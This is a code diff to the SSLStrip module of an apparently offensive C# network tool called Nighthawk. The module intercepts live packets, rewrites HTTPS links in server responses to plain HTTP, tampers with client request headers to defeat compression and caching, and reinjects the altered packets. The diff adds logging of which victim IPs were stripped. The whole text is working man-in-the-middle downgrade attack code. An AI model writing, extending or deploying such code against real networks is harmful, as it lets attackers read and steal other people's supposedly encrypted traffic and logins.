@@ -51,7 +51,15 @@ namespace Nighthawk
         private Regex regexModified = new Regex(@"If-Modified-Since: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
 
         // encoding converter
-        private static ASCIIEncoding encodingUtf8 = new ASCIIEncoding();
+        private static UTF8Encoding encodingUtf8 = new UTF8Encoding();
+
+        // SSL stripped event
+        public event SSLStripHandler OnSSLStripped;
+
+        private void Stripped(string sourceIP, string destIP, List<string> changed)
+        {
+            if (OnSSLStripped != null) OnSSLStripped(sourceIP, destIP, changed);
+        }
 
         // constructor
         public SSLStrip(LivePcapDevice device)
@@ -95,7 +103,7 @@ namespace Nighthawk
             
             if (data != string.Empty)
             {
-                var changed = false;
+                var changed = new List<string>();
                 var matches = SimpleRegex.GetMatches(regexType, data);
 
                 // client request
@@ -118,15 +126,16 @@ namespace Nighthawk
 
                         data = regexEncoding.Replace(data, "Accept-Encoding: "+ extra +"\r\n");
 
-                        changed = true;
+                        changed.Add("Accept-Encoding");
                     }
+
 
                     if (data.IndexOf("If-Modified-Since:") != -1)
                     {
                         DateTime time = new DateTime(1990, 1, 1);
                         
                         data = regexModified.Replace(data, "If-Modified-Since: "+ time.ToString("R") +"\r\n");
-                        changed = true;
+                        changed.Add("If-Modified-Since");
                     }
                 }
                 // server response
@@ -139,21 +148,17 @@ namespace Nighthawk
 
                     // check for images
                     if (cmatches.Count > 1 && cmatches[1].Contains("image")) return;
-                    
-                    if (data.IndexOf("\"https://") != -1)
+
+                    if (data.IndexOf("\"https://") != -1 || data.IndexOf("'https://") != -1)
                     {
                         data = data.Replace("\"https://", "\" http://");
-                        changed = true;
-                    }
-
-                    if (data.IndexOf("'https://") != -1)
-                    {
                         data = data.Replace("'https://", "' http://");
-                        changed = true;
+
+                        changed.Add("HTTPS");
                     }
                 }
                 
-                if (changed)
+                if (changed.Count > 0)
                 {
                     // re-pack data
                     var bytes = encodingUtf8.GetBytes(data);
@@ -167,8 +172,13 @@ namespace Nighthawk
                     ip.TotalLength = ip.HeaderLength + packet.Bytes.Length;
                     ip.PayloadLength = (ushort)packet.Bytes.Length;
                     ip.Checksum = ip.Checksum + diff; // dirty checksum fix
+
+                    Stripped(sourceIP, destIP, changed);
                 }
-            }
+            }           
         }
+
+        // SSLStripHandler
+        public delegate void SSLStripHandler(string sourceIP, string destIP, List<string> changed);
     }
 }
